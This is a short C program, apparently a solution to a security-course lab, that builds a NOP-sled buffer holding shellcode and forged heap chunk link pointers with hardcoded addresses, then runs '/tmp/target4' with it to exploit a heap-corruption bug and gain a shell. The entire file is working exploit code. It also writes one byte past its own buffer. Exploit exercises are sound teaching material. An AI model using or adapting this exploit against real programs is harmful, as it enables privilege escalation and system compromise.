#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define NOP                  0x90
#define SIZE           1000

int main(void)
{
  char *args[3];
  char *env[1];

  char bof [SIZE];
  int i,n;
  //190
   for(i=0; i<SIZE; i++){
      *(bof + i) = NOP;
    }
  //SHELLCODE
  n = 0 ;
 for(i=176- strlen(shellcode); n < strlen(shellcode); i++){
      *(bof + i) = shellcode[n++];
    }

  //P
  //LEFT=========JMP-AHEAD
  *(bof + 0) =  '\x90';
  *(bof + 1) =  '\x90';
  *(bof + 2) =  '\x0d';
  *(bof + 3) =  '\xeb';
  //RIGHT=========NEW q
                  //0x08059948
  *(bof + 4) =  '\x49';    //(+1)
  *(bof + 5) =  '\x99';
  *(bof + 6) =  '\x05';
  *(bof + 7) =  '\x8';

  //NEW q
  //LEFT========== P
  *(bof + 176) =  '\x90';//(To P's DATA)     //80(To P)     08059890
  *(bof + 177) =  '\x98';
  *(bof + 178) =  '\x05';
  *(bof + 179) =  '\x08';
  //RIGHT=========FOO's bffffe6c
  *(bof + 180) =  '\x8d' ;//(+1)
  *(bof + 181) =  '\xfa';
  *(bof + 182) =  '\xff';
  *(bof + 183) =  '\xbf';
  //bfffffe7c
  *(bof + 1000) =  '\x00';  

  args[0] = TARGET; args[1] = bof; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
